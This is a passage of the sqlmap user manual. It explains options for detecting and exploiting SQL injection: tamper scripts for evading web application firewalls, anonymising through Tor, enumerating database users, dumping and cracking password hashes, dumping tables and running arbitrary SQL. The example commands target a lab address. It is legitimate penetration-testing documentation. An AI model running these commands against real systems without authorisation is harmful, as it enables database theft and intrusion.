## Output verbosity

Option: `-v`

This option can be used to set the verbosity level of output messages. There exist **seven** levels of verbosity. The default level is **1** in which information, warning, error and critical messages and Python tracebacks (if any occur) will be displayed.

* **0**: Show only Python tracebacks, error and critical messages.
* **1**: Show also information and warning messages.
* **2**: Show also debug messages.
* **3**: Show also payloads injected.
* **4**: Show also HTTP requests.
* **5**: Show also HTTP responses' headers.
* **6**: Show also HTTP responses' page content.

A reasonable level of verbosity to further understand what sqlmap does under the hood is level **2**, primarily for the detection phase and the take-over functionalities. Whereas if you want to see the SQL payloads the tools sends, level **3** is your best choice. In order to further debug potential bugs or unexpected behaviours, we recommend you to set the verbosity to level **4** or above. This level is recommended to be used when you feed the developers with a bug report too.

## Target

At least one of these options has to be provided.

### Target URL

Option: `-u` or `--url`

Run sqlmap against a single target URL. This switch requires an argument which is the target URL in the form `http(s)://targeturl[:port]/[...]`.

### Parse targets from Burp or WebScarab proxy logs

Option: `-l`

Rather than providing a single target URL, it is possible to test and inject against HTTP requests proxied through [Burp proxy](http://portswigger.net/suite/) or 
[WebScarab proxy](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project). This option requires an argument which is the proxy's HTTP requests log file.

### Load HTTP request from a file

Option: `-r`

One of the possibilities of sqlmap is loading of complete HTTP request from a textual file. That way you can skip usage of bunch of other options (e.g. setting of cookies, POSTed data, etc).

Sample content of a HTTP request file provided as an argument to this option:

    POST /sqlmap/mysql/post_int.php HTTP/1.1
    Host: 192.168.136.131
    User-Agent: Mozilla/4.0
    
    id=1

### Process Google dork results as target addresses

Option: `-g`

It is also possible to test and inject on `GET` parameters on the results of your Google dork.

This option makes sqlmap negotiate with the search engine its session cookie to be able to perform a search, then sqlmap will retrieve Google first 100 results for the Google dork expression with `GET` parameters asking you if you want to test and inject on each possible affected URL.

### Load options from a configuration INI file

Option: `-c`

It is possible to pass user's options from a configuration INI file, an example is `sqlmap.conf`.

Note that if you also provide other options from command line, those are evaluated when running sqlmap and overwrite those provided in the configuration file.

## Request

These options can be used to specify how to connect to the target url.

### HTTP data

Option: `--data`

By default the HTTP method used to perform HTTP requests is `GET`, but you can implicitly change it to `POST` by providing the data to be sent in the `POST` requests. Such data, being those parameters, are tested for SQL injection as well as any provided `GET` parameters.

### HTTP `Cookie` header

Switches: `--cookie` and `--drop-set-cookie`

This feature can be useful in two ways:

* The web application requires authentication based upon cookies and you have such data.
* You want to detect and exploit SQL injection on such header values.

Either reason brings you to need to send cookies with sqlmap requests, the steps to go through are the following:

* Login to the application with your favourite browser.
* Get the HTTP Cookie from the browser's preferences or from the HTTP proxy screen and copy to the clipboard.
* Go back to your shell and run sqlmap by pasting your clipboard as the argument of the `--cookie` switch.


Note that the HTTP `Cookie` header values are usually separated by a `;` character, **not** by an `&`. sqlmap can recognize these as separate sets of `parameter=value` too, as well as GET and POST parameters.

If at any time during the communication, the web application responds with `Set-Cookie` headers, sqlmap will automatically use its value in all further HTTP requests as the `Cookie` header. sqlmap will also automatically test those values for SQL injection. This can be avoided by providing the switch `--drop-set-cookie` - sqlmap will ignore any coming `Set-Cookie` header.

Vice versa, if you provide a HTTP `Cookie` header with `--cookie` switch and the target URL sends an HTTP
`Set-Cookie` header at any time, sqlmap will ask you which set of cookies to use for the following HTTP requests.

Note that also the HTTP `Cookie` header is tested against SQL injection if the `--level` is set to **2** or above. Read below for details.

### HTTP `User-Agent` header


Option and switch: `--user-agent` and `--random-agent`

By default sqlmap performs HTTP requests with the following `User-Agent` header value:

    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)

However, it is possible to fake it with the `--user-agent` switch by providing custom User-Agent as the switch argument.

Moreover, by providing the `--random-agent` switch, sqlmap will randomly select a `User-Agent` from the `./txt/user-agents.txt` textual file and use it for all HTTP requests within the session.

Some sites perform a server-side check on the HTTP `User-Agent` header value and fail the HTTP response if a valid `User-Agent` is not provided, its value is not expected or is blacklisted by a web application firewall or similar intrusion prevention system. In this case sqlmap will show you a message as follows:

    [hh:mm:20] [ERROR] the target url responded with an unknown HTTP status code, try to 
    force the HTTP User-Agent header with option --user-agent or --random-agent

Note that also the HTTP `User-Agent` header is tested against SQL injection if the `--level` is set to **3** or above.
Read below for details.

### HTTP `Referer` header

Option: `--referer`

It is possible to fake the HTTP `Referer` header value. By default **no** HTTP `Referer` header is sent in HTTP requests if not explicitly set.

Note that also the HTTP `Referer` header is tested against SQL injection if the `--level` is set to **3** or above. Read below for details.

### Extra HTTP headers

Option: `--headers`

It is possible to provide extra HTTP headers by setting the `--headers` switch. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. Have a look at the sample `sqlmap.conf` file for an example.

### HTTP protocol authentication

Options: `--auth-type` and `--auth-cred`

These options can be used to specify which HTTP protocol authentication the web server implements and the valid credentials to be used to perform all HTTP requests to the target application.

The three supported HTTP protocol authentication mechanisms are:

* `Basic`
* `Digest`
* `NTLM`

While the credentials' syntax is `username:password`.

Example of valid syntax:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" \
    --auth-type Basic --auth-cred "testuser:testpass"

### HTTP protocol certificate authentication

Option: `--auth-cert`

This switch should be used in cases when the web server requires proper client-side certificate for authentication. Supplied values should be in the form: `key_file,cert_file`, where `key_file` should be the name of a PEM formatted file that contains your private key, while `cert_file` should be the name for a PEM formatted certificate chain file.

### HTTP(S) proxy

Options and switch: `--proxy`, `--proxy-cred`, `--tor` and `--ignore-proxy`

It is possible to provide an HTTP(S) proxy address to pass by the HTTP(S) requests to the target URL. The syntax of HTTP(S) proxy value is `http://url:port`.

If the HTTP(S) proxy requires authentication, you can provide the credentials in the format `username:password` to the
`--proxy-cred` switch.

If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained on the Tor client guide and use the Privoxy daemon, by default listening on `127.0.0.1:8118`, as the sqlmap proxy by simply providing the tool with the option `--tor` instead of `--proxy`.

Switch `--ignore-proxy` should be used when you want to run sqlmap against a target part of a local area network by ignoring the system-wide set HTTP(S) proxy server setting.

### Delay between each HTTP request

Option: `--delay`

It is possible to specify a number of seconds to hold between each HTTP(S) request. The valid value is a float, for instance `0.5` means half a second. By default, no delay is set.

### Seconds to wait before timeout connection

Option: `--timeout`

It is possible to specify a number of seconds to wait before considering the HTTP(S) request timed out. The valid value is a float, for instance 10.5 means ten seconds and a half. By default **30 seconds** are set.

### Maximum number of retries when the HTTP connection timeouts

Option: `--retries`

It is possible to specify the maximum number of retries when the HTTP(S) connection timeouts. By default it retries up to **three times**.

### Filtering targets from provided proxy log using regular expression

Option: `--scope`

Rather than using all hosts parsed from provided logs with switch `-l`, you can specify valid Python regular expression to be used for filtering desired ones.

Example of valid syntax:

    $ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"

### Avoid your session to be destroyed after too many unsuccessful requests

Options: `--safe-url` and `--safe-freq`

Sometimes web applications or inspection technology in between destroys the session if a certain number of unsuccessful requests is performed. This might occur during the detection phase of sqlmap or when it exploits any of the blind SQL injection types. Reason why is that the SQL payload does not necessarily returns output and might therefore raise a signal to either the application session management or the inspection technology.

To bypass this limitation set by the target, you can provide two options:

* `--safe-url`: Url address to visit frequently during testing.
* `--safe-freq`: Test requests between two visits to a given safe url.

This way, sqlmap will visit every a predefined number of requests a certain _safe_ URL without performing any kind of injection against it.

## Optimization

These switches can be used to optimize the performance of sqlmap.

### Bundle optimization

Switch: `-o`

This switch is an alias that implicitly sets the following options and switches:

* `--keep-alive`
* `--null-connection`
* `--threads=3` if not set to a higher value.


Read below for details about each switch.

### Output prediction

Switch: `--predict-output`

This switch is used in inference algorithm for sequential statistical prediction of characters of value being retrieved. Statistical table with the most promising character values is being built based on items given in `txt/common-outputs.txt` combined with the knowledge of current enumeration used. In case that the value can be found among the common output values, as the process progresses, subsequent character tables are being narrowed more and more. If used in combination with retrieval of common DBMS entities, as with system table names and privileges, speed up is significant. Of course, you can edit the common outputs file according to your needs if, for instance, you notice common patterns in database table names or similar.

Note that this switch is not compatible with `--threads` switch.

### HTTP Keep-Alive

Switch: `--keep-alive`

This switch instructs sqlmap to use persistent HTTP(s) connections.

Note that this switch is incompatible with `--proxy` switch.

### HTTP NULL connection

Switch: `--null-connection`

There are special HTTP request types which can be used to retrieve HTTP response's size without getting the HTTP body. This knowledge can be used in blind injection technique to distinguish `True` from `False` responses. When this switch is provided, sqlmap will try to test and exploit two different _NULL connection_ techniques: `Range` and `HEAD`. If any of these is supported by the target web server, speed up will come from the obvious saving of used bandwidth.

These techniques are detailed in the white paper [Bursting Performances in Blind SQL Injection - Take 2 (Bandwidth)](http://www.wisec.it/sectou.php?id=472f952d79293).

Note that this switch is incompatible with switch `--text-only`.

### Concurrent HTTP(S) requests

Switch: `--threads`

It is possible to specify the maximum number of concurrent HTTP(S) requests that sqlmap is allowed to do.
This feature relies on the [multi-threading](http://en.wikipedia.org/wiki/Multithreading) concept and inherits both its pro and its cons.

This features applies to the brute-force switches and when the data fetching is done through any of the blind SQL injection techniques. For the latter case, sqlmap first calculates the length of the query output in a single thread, then starts the multi-threading. Each thread is assigned to retrieve one character of the query output. The thread ends when that character is retrieved - it takes up to 7 HTTP(S) requests with the bisection algorithm implemented in sqlmap.

The maximum number of concurrent requests is set to **10** for performance and site reliability reasons.

Note that this switch is not compatible with `--predict-output` switch.

## Injection

These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts.

### Testable parameter(s)

Option: `-p`

By default sqlmap tests all `GET` parameters and `POST` parameters. When the value of `--level` is >= **2** it tests also HTTP `Cookie` header values. When this value is >= **3** it tests also HTTP `User-Agent` and HTTP `Referer` header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on the value of `--level` too. 

For instance, to test for GET parameter `id` and for HTTP `User-Agent` only, provide `-p id,user-agent`.

### URI injection point

There are special cases when injection point is within the URI itself. sqlmap does not perform any automatic test against URI paths, unless manually pointed to. You have to specify these injection points in the command line by appending an asterisk (`*`) after each URI point that you want sqlmap to test for and exploit a SQL injection. 

This is particularly useful when, for instance, Apache web server's [mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html) module is in use or other similar technologies.

An example of valid command line would be:

    $ python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"

### Force the DBMS

Option: `--dbms`

By default sqlmap automatically detects the web application's back-end database management system. As of version **0.9**, sqlmap fully supports the following database management systems: 

* MySQL
* Oracle
* PostgreSQL
* Microsoft SQL Server
* Microsoft Access
* SQLite
* Firebird
* Sybase
* SAP MaxDB

If for any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identified or if you want to avoid an active fingeprint, you can provide the name of the back-end DBMS yourself (e.g. `postgresql`). For MySQL and Microsoft SQL Server provide them respectively in the form `MySQL  <version>` and `Microsoft SQL Server  <version> `, where ` <version>` is a valid version for the DBMS; for instance `5.0` for MySQL and `2005` for Microsoft SQL Server.

In case you provide `--fingerprint` together with `--dbms`, sqlmap will only perform the extensive fingerprint for the specified database management system only, read below for further details. 

Note that this option is **not** mandatory and it is strongly recommended to use it **only if you are absolutely sure** about the back-end database management system. If you do not know it, let sqlmap automatically fingerprint it for you.

### Force the database management system operating system name

Option: `--os`

By default sqlmap automatically detects the web application's back-end database management system underlying operating system when this information is a dependence of any other provided switch. At the moment the fully supported operating systems are two:

* Linux
* Windows

It is possible to force the operating system name if you already know it so that sqlmap will avoid doing it itself.

Note that this option is **not** mandatory and it is strongly recommended to use it **only if you are absolutely sure** about the back-end database management system underlying operating system. If you do not know it, let sqlmap automatically identify it for you. 

### Custom injection payload

Options: `--prefix` and `--suffix`

In some circumstances the vulnerable parameter is exploitable only if the user provides a specific suffix to be appended to the injection payload. Another scenario where these options come handy presents itself when the user already knows that query syntax and want to detect and exploit the SQL injection by directly providing a injection payload prefix and suffix. 

Example of vulnerable source code:

    $query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";

To detect and exploit this SQL injection, you can either let sqlmap detect the **boundaries** (as in combination of SQL payload prefix and suffix) for you during the detection phase, or provide them on your own.

For example: 

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" \
    -p id --prefix "')" --suffix "AND ('abc'='abc"
    [...]

This will result in all sqlmap requests to end up in a query as follows:

    $query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";

Which makes the query syntactically correct.

In this simple example, sqlmap could detect the SQL injection and exploit it without need to provide custom boundaries, but sometimes in real world application it is necessary to provide it when the injection point is within nested `JOIN` queries for instance. 

### Tamper injection data

Option: `--tamper`

sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their `CHAR()`-alike representation. 

This switch can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually. 

To take advantage of this switch, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the `tamper/` folder or edit them as long as you concatenate them comma-separated as the argument of `--tamper` switch. 

The format of a valid tamper script is as follows:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ {.python}
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload):
    '''
    Description of your tamper script
    '''

    retVal = payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

You can check valid and usable tamper scripts in the `tamper/` directory.

Example against a MySQL target assuming that `>` character, spaces and capital `SELECT` string are banned:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper \
    tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

## Detection

These options can be used to specify how to parse and compare page
content from HTTP responses when using blind SQL injection technique.

### Level

Option: `--level`

This switch requires an argument which specifies the level of tests to perform. There are **five** levels. The default value is **1** where limited number of tests (requests) are performed. Vice versa, level **5** will test verbosely for a much larger number of payloads and boundaries (as in pair of SQL payload prefix and suffix). The payloads used by sqlmap are specified in the textual file `xml/payloads.xml`. Following the instructions on top of the file, if sqlmap misses an injection, you should be able to add your own payload(s) to test for too!

Not only this switch affects which payload sqlmap tries, but also which injection points are taken in exam: GET and POST parameters are **always** tested, HTTP Cookie header values are tested from level **2** and HTTP User-Agent/Referer headers' value is tested from level **3**.

All in all, the harder it is to detect a SQL injection, the higher the `--level` must be set.

It is strongly recommended to higher this value before reporting to the mailing list that sqlmap is not able to detect a certain injection point. 

### Risk

Option: `--risk`

This switch requires an argument which specifies the risk of tests to perform. There are **four** risk values. The default value is **1** which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also `OR`-based SQL injection tests.

In some instances, like a SQL injection in an `UPDATE` statement, injecting an `OR`-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this switch has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous switch, the payloads used by sqlmap are specified in the textual file `xml/payloads.xml` and you are free to edit and add your owns.

### Page comparison

Options and switch: `--string`, `--regexp` and `--text-only`

By default the distinction of a `True` query by a `False` one (rough concept behind boolean-based blind SQL injection vulnerabilities) is done by comparing the injected requests page content with the original not injected page content.
Not always this concept works because sometimes the page content changes at each refresh even not injecting anything, for instance when the page has a counter, a dynamic advertisement banner or any other part of the HTML which is rendered dynamically and might change in time not only consequently to user's input. To bypass this limit, sqlmap tries hard to identify these snippets of the response bodies and deal accordingly. Sometimes it may fail, that is why the user can provide a string (`--string` switch) which is **always** present on the not injected page **and** on all True injected query pages, but that it is **not** on the False ones. As an alternative to a static string, the user can provide a regular expression (`--regexp` switch).

Such data is easy for an user to retrieve, simply try to inject on the affected parameter an invalid value and compare manually the original (not injected) page content with the injected wrong page content. This way the distinction will be based upon string presence or regular expression match. 

In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses' body, you can filter pages (`--text-only` switch) just for their textual content. This way, in a good number of cases, you can automatically tune the detection engine.

## Techniques

These options can be used to tweak testing of specific SQL injection techniques.

### SQL injection techniques to test for

Option: `--technique`

This switch can be used to specify which SQL injection type to test for. By default sqlmap tests for **all** types/techniques it supports.

In certain situations you may want to test only for one or few specific types of SQL injection thought and this is where this switch comes into play. 

This switch requires an argument. Such argument is a string composed by any combination of `B`, `E`, `U`, `S` and `T` characters where each letter stands for a different technique: 

* `B`: Boolean-based blind
* `E`: Error-based
* `U`: Union query-based
* `S`: Stacked queries
* `T`: Time-based blind

For instance, you can provide `ES` if you want to test for and exploit error-based and stacked queries SQL injection types only. The default value is `BEUST`. 

Note that the string must include stacked queries technique letter, `S`, when you want to access the file system, takeover the operating system or access Windows registry hives. 

### Seconds to delay the DBMS response for time-based blind SQL injection

Option: `--time-sec`

It is possible to set the seconds to delay the response when testing for time-based blind SQL injection, by providing the `--time-sec` option followed by an integer. By default it's value is set to **5 seconds**. 

### Number of columns in UNION query SQL injection

Option: `--union-cols`

By default sqlmap tests for UNION query SQL injection technique using 1 to 10 columns. However, this range can be increased up to 50 columns by providing an higher `--level` value. See the relevant paragraph for more details. 

You can manually tell sqlmap to test for this type of SQL injection with a specific range of columns by providing the tool with the `--union-cols` switch followed by a range of integers. For instance, `12-16` means tests for UNION query SQL injection by using 12 up to 16 columns. 

### Character to use to test for UNION query SQL injection

Option: `--union-char`

By default sqlmap tests for UNION query SQL injection technique using `NULL` character. However, by providing an higher `--level` value sqlmap will performs tests also with a random number because there are some corner cases where UNION query tests with `NULL` fail whereas with a random integer they succeed.

You can manually tell sqlmap to test for this type of SQL injection with a specific character by providing the tool with the option `--union-char` followed by a string.

## Fingerprint

### Extensive database management system fingerprint

Switches: `-f` or `--fingerprint`

By default the web application's back-end database management system fingerprint is handled automatically by sqlmap. Just after the detection phase finishes and the user is eventually prompted with a choice of which vulnerable parameter to use further on, sqlmap fingerprints the back-end database management system and carries on the injection by knowing which SQL syntax, dialect and queries to use to proceed with the attack within the limits of the database architecture. 

If for any instance you want to perform an extensive database management system fingerprint based on various techniques like specific SQL dialects and inband error messages, you can provide the `--fingerprint` switch. sqlmap will perform a lot more requests and fingerprint the exact DBMS version and, where possible, operating system, architecture and patch level. 

If you want the fingerprint to be even more accurate result, you can also provide the `-b` or `--banner` switch. 

## Enumeration

These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements. 

### Banner

Switch: `-b` or `--banner`

Most of the modern database management systems have a function and/or  an environment variable which returns the database management system version and eventually details on its patch level, the underlying system. Usually the function is `version()` and the environment variable is `@@version`, but this vary depending on the target DBMS. 

### Session user

Switch: `--current-user`

On the majority of modern DBMSes is possible to retrieve the database management system's user which is effectively performing the query against the back-end DBMS from the web application. 

### Current database

Switch: `--current-db`

It is possible to retrieve the database management system's database name that the web application is connected to.

### Detect whether or not the session user is a database administrator

Switch: `--is-dba`

It is possible to detect if the current database management system session user is a database administrator, also known as DBA. sqlmap will return `True` if it is, viceversa `False`. 

### List database management system users

Switch: `--users`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the list of users. 

### List and crack database management system users password hashes

Switches: `--passwords` and `-U`

When the session user has read access to the system table containing information about the DBMS users' passwords, it is possible to enumerate the password hashes for each database management system user. sqlmap will first enumerate the users, then the different password hashes for each of them. 

Example against a PostgreSQL target:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1

    [...]
    back-end DBMS: PostgreSQL
    [hh:mm:38] [INFO] fetching database users password hashes
    do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
    [hh:mm:42] [INFO] using hash method: 'postgres_passwd'
    what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt] 
    [hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
    do you want to use common password suffixes? (slow!) [y/N] n
    [hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
    [hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
    [hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
    database management system users password hashes:
    [*] postgres [1]:
        password hash: md5d7d880f96044b72d0bba108ace96d1e4
        clear-text password: testpass
    [*] testuser [1]:
        password hash: md599e5ea7a6f7c3269995cba3927fd0093
        clear-text password: testpass

Not only sqlmap enumerated the DBMS users and their passwords, but it also recognized the hash format to be PostgreSQL, asked the user whether or not to test the hashes against a dictionary file and identified the clear-text password for the `postgres` user, which is usually a DBA along the other user, `testuser`, password. 

This feature has been implemented for all DBMS where it is possible to enumerate users' password hashes, including Oracle and Microsoft SQL Server pre and post 2005. 

You can also provide the `-U` option to specify the specific user who you want to enumerate and eventually crack the password hash(es). If you provide `CU` as username it will consider it as an alias for current user and will retrieve the password hash(es) for this user. 

### List database management system users privileges

Switches: `--privileges` and `-U`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the privileges for each database management system user. By the privileges, sqlmap will also show you which are database administrators.

You can also provide the `-U` option to specify the user who you want to enumerate the privileges.

If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user. 

On Microsoft SQL Server, this feature will display you whether or not each user is a database administrator rather than the list of privileges for all users.

### List database management system users roles

Switches: `--roles` and `-U`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the roles for each database management system user.

You can also provide the `-U` option to specify the user who you want to enumerate the privileges.

If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user.

This feature is only available when the DBMS is Oracle.

### List database management system's databases

Switch: `--dbs`

When the session user has read access to the system table containing information about available databases, it is possible to enumerate the list of databases. 

### Enumerate database's tables

Switches: `--tables`, `-D` and `--exclude-sysdbs`

When the session user has read access to the system table containing information about databases' tables, it is possible to enumerate the list of tables for a specific database management system's databases.

If you do not provide a specific database with switch `-D`, sqlmap will enumerate the tables for all DBMS databases.

You can also provide the `--exclude-sysdbs` switch to exclude all system databases.

Note that on Oracle you have to provide the `TABLESPACE_NAME` instead of the database name.

### Enumerate database table columns

Switch and options: `--columns`, `-C`, `-T` and `-D`

When the session user has read access to the system table containing information about database's tables, it is possible to enumerate the list of columns for a specific database table. sqlmap also enumerates the data-type for each column. 

This feature depends on the option `-T` to specify the table name and optionally on `-D` to specify the database name. When the database name is not specified, the current database name is used. You can also provide the `-C` option to specify the table columns name like the one you provided to be enumerated.

Example against a SQLite target:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns \
    -D testdb -T users -C name
    [...]
    Database: SQLite_masterdb
    Table: users
    [3 columns]
    +---------+---------+
    | Column  | Type    |
    +---------+---------+
    | id      | INTEGER |
    | name    | TEXT    |
    | surname | TEXT    |
    +---------+---------+


Note that on PostgreSQL you have to provide `public` or the name of a system database. That's because it is not possible to enumerate  other databases tables, only the tables under the schema that the web application's user is connected to, which is always aliased by `public`. 

### Enumerate database management system schema

Switch: `--schema`

[TODO]

### Retrieve number of entries for table(s)

Switch: `--count`

[TODO]

### Dump database table entries

Switch and options: `--dump`, `-C`, `-T`, `-D`, `--start`, `--stop`, `--first` and `--last`

When the session user has read access to a specific database's table it is possible to dump the table entries.

This functionality depends on switch `-T` to specify the table name and optionally on switch `-D` to specify the database name. If the table name is provided, but the database name is not, the current database name is used.

Example against a Firebird target:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
    [...]
    Database: Firebird_masterdb
    Table: USERS
    [4 entries]
    +----+--------+------------+
    | ID | NAME   | SURNAME    |
    +----+--------+------------+
    | 1  | luther | blisset    |
    | 2  | fluffy | bunny      |
    | 3  | wu     | ming       |
    | 4  | NULL   | nameisnull |
    +----+--------+------------+

This switch can also be used to dump all tables' entries of a provided database. You simply have to provide sqlmap with the `--dump` switch along with only the `-D` switch, no `-T` and no `-C`. 

You can also provide a comma-separated list of the specific columns to dump with the `-C` switch.

sqlmap also generates for each table dumped the entries in a CSV format textual file. You can see the absolute path where sqlmap creates the file by providing a verbosity level greater than or equal to **1**.

If you want to dump only a range of entries, then you can provide switches `--start` and/or `--stop` to respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you want to dump only the first entry, provide `--stop 1` in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide `--start 1` `--stop 3`.

It is also possible to specify which single character or range of characters to dump with switches `--first` and `--last`. For instance, if you want to dump columns' entries from the third to the fifth character, provide `--first 3` `--last 5`. This feature only applies to the blind SQL injection techniques because for error-based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column's entry output to dump.

As you may have noticed by now, sqlmap is **flexible**: you can leave it to automatically dump the whole database table or you can be very precise in which characters to dump, from which columns and which range of entries.

### Dump all databases tables entries

Switches: `--dump-all` and `--exclude-sysdbs`

It is possible to dump all databases tables entries at once that the session user has read access on.

You can also provide the `--exclude-sysdbs` switch to exclude all system databases. In that case sqlmap will only dump entries of users' databases tables.

Note that on Microsoft SQL Server the `master` database is not considered a system database because some database administrators use it as a users' database.

### Search for columns, tables or databases

Switch and options: `--search`, `-C`, `-T`, `-D`

This switch allows you to **search for specific database names, specific tables across all databases or specific columns across all databases' tables**. 

This is useful, for instance, to identify tables containing custom application credentials where relevant columns' names contain string like _name_ and _pass_.

Switch `--search` needs to be used in conjunction with one of the following support switches:

* `-C` following a list of comma-separated column names to look for across the whole database management system.
* `-T` following a list of comma-separated table names to look for across the whole database management system.
* `-D` following a list of comma-separated database names to look for across the database management system.

### Run custom SQL statement

Option and switch: `--sql-query` and `--sql-shell`

The SQL query and the SQL shell features allow to run arbitrary SQL statements on the database management system. sqlmap automatically dissects the provided statement, determines which technique is appropriate to use to inject it and how to pack the SQL payload accordingly. 

If the query is a `SELECT` statement, sqlmap will retrieve its output. Otherwise it will execute the query through the stacked query SQL injection technique if the web application supports multiple statements on the back-end database management system. Beware that some web application technologies do not support stacked queries on specific database management systems. For instance, PHP does not support stacked queries when the back-end DBMS is MySQL, but it does support when the back-end DBMS is PostgreSQL.

Examples against a Microsoft SQL Server 2000 target:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
    "SELECT 'foo'" -v 1

    [...]
    [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
    [hh:mm:14] [INFO] retrieved: foo
    SELECT 'foo':    'foo'

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
    "SELECT 'foo', 'bar'" -v 2

    [...]
    [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
    [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
    distinct queries to be able to retrieve the output even if we are going blind
    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
    (CHAR(32)))
    [hh:mm:50] [INFO] retrieved: foo
    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
    (CHAR(32)))
    [hh:mm:50] [INFO] retrieved: bar
    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
    SELECT 'foo', 'bar':    'foo, bar'

As you can see, sqlmap splits the provided query into two different `SELECT` statements then retrieves the output for each separate query. 

If the provided query is a `SELECT` statement and contains a `FROM` clause, sqlmap will ask you if such statement can return multiple entries. In that case the tool knows how to unpack the query correctly to count the number of possible entries and retrieve its output, entry per entry. 

The SQL shell option allows you to run your own SQL statement interactively, like a SQL console connected to the database management system. This feature provides TAB completion and history support too. 

## Brute force

These options can be used to run brute force checks.

### Brute force tables names

Switch: `--common-tables`

There are cases where `--tables` switch can not be used to retrieve the databases' table names. These cases usually fit into one of the following categories: 

* The database management system is MySQL ** < 5.0** where `information_schema` is not available.
* The database management system is Microsoft Access and system table `MSysObjects` is not readable - default setting.
* The session user does not have read privileges against the system table storing the scheme of the databases.

If any of the first two cases apply and you provided the `--tables` switch, sqlmap will prompt you with a question
to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-tables` switch. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.

The list of common table names is `txt/common-tables.txt` and you can edit it as you wish.

Example against a MySQL 4.1 target:

    $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" \
    --common-tables -D testdb --banner

### Brute force columns names

Switch: `--common-columns`

As per tables, there are cases where `--columns` switch can not be used to retrieve the databases' tables' column names. These cases usually fit into one of the following categories: 

* The database management system is MySQL ** < 5.0** where `information_schema` is not available.
* The database management system is Microsoft Access where this kind of information is not available inside system tables.
* The session user does not have read privileges against the system table storing the scheme of the databases.

If any of the first two cases apply and you provided the `--columns` switch, sqlmap will prompt you with a question
to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-columns` switch. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.

The list of common table names is `txt/common-columns.txt` and you can edit it as you wish.

## User-defined function injection

These options can be used to create custom user-defined functions.

### Inject custom user-defined functions (UDF)

Options: `--udf-inject` and `--shared-lib`

